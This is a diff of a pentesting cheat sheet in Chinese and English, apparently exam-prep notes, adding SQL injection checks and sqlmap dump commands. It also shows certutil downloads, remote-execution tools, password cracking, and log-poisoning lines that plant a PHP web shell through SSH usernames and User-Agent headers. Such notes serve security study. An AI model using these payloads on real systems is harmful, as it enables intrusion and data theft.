@@ -2,7 +2,7 @@ Markdown語法：https://hackmd.io/@eMP9zQQ0Qt6I8Uqp2Vqy6w/SyiOheL5N/%2FBVqowKsh
   
 https://blog.stevenyu.tw/2022/06/10/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-cpent-%E8%80%83%E8%A9%A6%E5%BF%83%E5%BE%97%E3%80%81%E4%BB%A5%E5%8F%8A%E8%88%87-oscp-%E7%9A%84%E6%AF%94%E8%BC%83/  
 ## NMAP Reacon ##  
-nmap -sS -n -p 445 --script smb-protocls 192.168.1.1 
+nmap -sS -n -p 445 --script smb-protocls 192.168.1.1   
 
 ## AD Reacon ##  
 
@@ -31,7 +31,7 @@ certutil -urlcache -split -f <URL> <輸出檔名>
 # WinRM #  
 evil-winrm  
 # RDP #  
-xfreerdp3 
+xfreerdp3  
 # psexec #  
 impacket-psexec  
 psexec \\192.168.1.1: cmd.exe  
@@ -52,7 +52,7 @@ b main
 run  
 info registers  
 disassemble main  
-p system
+p system  
 search /bin/sh  
 
 ## Privilege Escalation #  
@@ -86,12 +86,30 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>
 ``` whatweb -v 192.168.1.1 ```   
 ``` whatweb --log-verbose=log.txt 192.168.1.1 ```   
 
+
+## SQLi #  
+# 手動確認漏洞存在 #  
+單引號'  
+變數及單引號 abc'  
+數字1  
+數字0  
+# sqlmap #  
+```sqlmap -u "www.example.com" --cooikes=<cookies>  --dump  ```   
+```sqlmap -u "www.example.com" --cooikes=<cookies>  --dump  ```  
+```sqlmap -u "www.example.com" --cooikes=<cookies>  --dbs  ```  
+```sqlmap -u "www.example.com" --cooikes=<cookies>  -D [Database name] --tables  ```  
+
+```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  
+
+```sqlmap -u "www.example.com" --method POST --data "[Copied POST Request]" -p '[vuln field name]' --dbs ```  
+```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  
+
 ## Log Poison  
 # SSH Log (/var/log/auth.log)  
-ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1
-ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1
+ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1  
+ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1  
 # Apache Log (/var/log/apache2/access.log)  
-User-Agent: <?php system($_GET['cmd']); ?>
+User-Agent: <?php system($_GET['cmd']); ?>  
 
 ## Reverse Shell
 # php #  
